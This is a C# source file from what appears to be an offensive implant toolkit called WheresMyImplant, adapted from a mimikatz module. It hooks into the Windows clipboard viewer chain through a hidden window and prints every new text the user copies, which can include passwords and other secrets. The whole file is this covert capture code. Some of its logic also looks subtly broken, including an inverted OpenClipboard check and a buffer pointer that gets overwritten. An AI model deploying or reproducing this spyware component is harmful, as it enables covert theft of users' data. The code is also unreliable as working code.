using System;
using System.Linq;
using System.Runtime.InteropServices;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;

namespace WheresMyImplant
{
    //https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_misc.c
    sealed class ClipboardNative : Base, IDisposable
    {
        private const String szName = "Clippy";

        private IntPtr hInstance;
        private IntPtr hWndClipboard;
        private IntPtr hWndViewer;

        private GCHandle gcParam;

        private UInt16 lpClassName;

        private IntPtr data;
        private UInt32 dwData;
        private UInt32 sequenceNumber;

        private delegate UInt32 lpfnWndProcDelegate(IntPtr hwnd, UInt32 uMsg, IntPtr wParam, String lParam);

        public ClipboardNative()
        {
            hInstance = kernel32.GetModuleHandle(String.Empty);

            data = IntPtr.Zero;
            dwData = 0;
            sequenceNumber = 0;
        }

        public void Monitor()
        {
            if (!kernel32.SetConsoleCtrlHandler(new kernel32.HandlerRoutine(HandlerRoutine), true))
            {
                Console.WriteLine("[-] {0} 0x{1:X}", "SetConsoleCtrlHandler Failed", Marshal.GetLastWin32Error());
                Console.WriteLine("[-] {0}\n", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                return;
            }



            lpfnWndProcDelegate lpfnWndProc = FnWndProc;
            Winuser.WNDCLASSEX lpwcx = Winuser.WNDCLASSEX.Build();
            lpwcx.lpfnWndProc = lpfnWndProc;
            lpwcx.lpszClassName = szName + "_Window";
            lpClassName = user32.RegisterClassEx(ref lpwcx);
            if (0 == lpClassName)
            {
                Console.WriteLine("[-] {0} 0x{1:X}", "RegisterClassEx Failed", Marshal.GetLastWin32Error());
                Console.WriteLine("[-] {0}\n", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                return;
            }
            Console.WriteLine("[+] Registered Class 0x{0}", lpClassName.ToString("X4"));



            hWndClipboard = user32.CreateWindowEx(Winuser.WindowStylesEx.WS_EX_RIGHTSCROLLBAR, new IntPtr(lpClassName), "Monitor", 0, 0, 0, 0, 0, Winuser.HWND_MESSAGE, IntPtr.Zero, hInstance, IntPtr.Zero);
            if (IntPtr.Zero == hWndClipboard || !user32.IsWindow(hWndClipboard))
            {
                Console.WriteLine("[-] {0} 0x{1:X}", "CreateWindowEx Failed", Marshal.GetLastWin32Error());
                Console.WriteLine("[-] {0}\n", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                return;
            }
            Console.WriteLine("[+] Created Window 0x{0}", hWndClipboard.ToString("X4"));



            hWndViewer = user32.SetClipboardViewer(hWndClipboard);
            if (IntPtr.Zero == hWndViewer)
            {
                Console.WriteLine("[-] {0} 0x{1:X}", "SetClipboardViewer Failed", Marshal.GetLastWin32Error());
                Console.WriteLine("[-] {0}\n", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                return;
            }
            Console.WriteLine("[+] Created Clipboard Viewer 0x{0}", hWndViewer.ToString("X4"));



            Winuser.tagMSG lpMsg = new Winuser.tagMSG();
            Boolean result;
            do
            {
                Console.WriteLine("Waiting");
                result = user32.GetMessage(ref lpMsg, hWndViewer, Winuser.WM_QUIT, Winuser.WM_CHANGECBCHAIN);
                if (result)
                {
                    user32.TranslateMessage(ref lpMsg);
                    user32.DispatchMessage(ref lpMsg);
                }
                else
                {
                    Console.WriteLine("[-] {0} 0x{1:X}", "GetMessage Failed", Marshal.GetLastWin32Error());
                    Console.WriteLine("[-] {0}\n", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                    Console.WriteLine("Press Any Key to Continue");
                    Console.ReadKey();
                }
            }
            while (result);



            if (!user32.ChangeClipboardChain(hWndClipboard, hWndViewer))
            {
                Console.WriteLine("[-] {0} 0x{1:X}", "ChangeClipboardChain Failed", Marshal.GetLastWin32Error());
                Console.WriteLine("[-] {0}\n", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                return;
            }



            kernel32.SetConsoleCtrlHandler(new kernel32.HandlerRoutine(HandlerRoutine), false);
            if (!user32.DestroyWindow(hWndClipboard))
            {
                Console.WriteLine("[-] {0} 0x{1:X}", "DestroyWindow Failed", Marshal.GetLastWin32Error());
                Console.WriteLine("[-] {0}\n", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                return;
            }
        }

        public Boolean HandlerRoutine(Wincon.CtrlType dwCtrlType)
        {
            if (IntPtr.Zero != hWndClipboard)
            {
                user32.PostMessage(hWndClipboard, Winuser.WM_QUIT, 0x00000080, 0);
            }

            switch (dwCtrlType)
            {
                case Wincon.CtrlType.CTRL_C_EVENT:
                    return true;
                case Wincon.CtrlType.CTRL_BREAK_EVENT:
                    return true;
                case Wincon.CtrlType.CTRL_CLOSE_EVENT:
                    return false;
                case Wincon.CtrlType.CTRL_LOGOFF_EVENT:
                    return false;
                case Wincon.CtrlType.CTRL_SHUTDOWN_EVENT:
                    return false;
                default:
                    return false;
            }
        }

        public UInt32 FnWndProc(IntPtr hwnd, UInt32 uMsg, IntPtr wParam, String lParam)
        {
            UInt32 result = 0;

            switch(uMsg)
            {
                case Winuser.WM_CHANGECBCHAIN:
                    if (wParam == hWndViewer)
                        hWndViewer = GCHandle.Alloc(lParam, GCHandleType.Pinned).AddrOfPinnedObject();
                    else if (IntPtr.Zero != hWndViewer)
                        result = (UInt32)user32.SendMessage(hWndViewer, uMsg, wParam, lParam).ToInt64();
                    break;
                case Winuser.WM_DRAWCLIPBOARD:
                    UInt32 current = user32.GetClipboardSequenceNumber();
                    if (current != sequenceNumber)
                    {
                        sequenceNumber = current;
                        if (!user32.OpenClipboard(hwnd))
                        {
                            UInt32 bestFormat = 0;
                            for (UInt32 format = user32.EnumClipboardFormats(0); Convert.ToBoolean(format) && (bestFormat != (UInt32)Winuser.ClipboardFormats.CF_UNICODETEXT); format = user32.EnumClipboardFormats(format))
                                if (format == (UInt32)Winuser.ClipboardFormats.CF_TEXT || format == (UInt32)Winuser.ClipboardFormats.CF_UNICODETEXT)
                                    if (format > bestFormat)
                                        bestFormat = format;
                                    
                            if (Convert.ToBoolean(bestFormat))
                            {
                                IntPtr hData = user32.GetClipboardData(bestFormat);
                                if (IntPtr.Zero != hData)
                                {
                                    Console.WriteLine("hData 0x{0}", hData.ToString("X4"));
                                    UInt32 size = kernel32.GlobalSize(hData);
                                    Console.WriteLine("size {0}", size);
                                    Boolean sameData = false;
                                    if (Convert.ToBoolean(size))
                                    {
                                        Boolean samesize = (size == dwData);
                                        if (samesize && IntPtr.Zero != data)
                                        {
                                            Byte[] data1 = new Byte[size];
                                            Byte[] data2 = new Byte[size];
                                            Marshal.Copy(data, data1, 0, (Int32)size);
                                            Marshal.Copy(hData, data2, 0, (Int32)size);
                                            sameData = data1.SequenceEqual(data2);
                                        }

                                        if (!samesize)
                                        {
                                            if (IntPtr.Zero != data)
                                            {
                                                data = kernel32.LocalFree(data);
                                                dwData = 0;
                                            }
                                            data = Marshal.AllocHGlobal((Int32)size);
                                            dwData = size;
                                        }

                                        if (!sameData && (IntPtr.Zero != data))
                                        {
                                            data = hData;
                                            Console.WriteLine("Data: {0}", Marshal.PtrToStringAuto(data));
                                        }
                                    }
                                }
                                else
                                {
                                    Console.WriteLine("[-] {0} 0x{1:X}", "GetClipboardData Failed", Marshal.GetLastWin32Error());
                                    Console.WriteLine("[-] {0}\n", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
                                }
                            }
                            user32.CloseClipboard();
                        }
                    }
                    result = (UInt32)user32.SendMessage(hWndViewer, uMsg, wParam, lParam).ToInt64();
                    break;
                default:
                    result = (UInt32)user32.DefWindowProcW(hwnd, uMsg, wParam, lParam).ToInt64();
                    break;
            }
            return result;
        }

        public void Dispose()
        {
            if (!user32.DestroyWindow(hWndClipboard))
            {
                Console.WriteLine("DestroyWindow Failed");
            }

            if (!user32.UnregisterClass(Convert.ToString(lpClassName), hInstance))
            {
                Console.WriteLine("UnregisterClass Failed");
            }

            if (gcParam.IsAllocated)
            {
                gcParam.Free();
            }
        }

        ~ClipboardNative()
        {
            Dispose();
        }
    }
}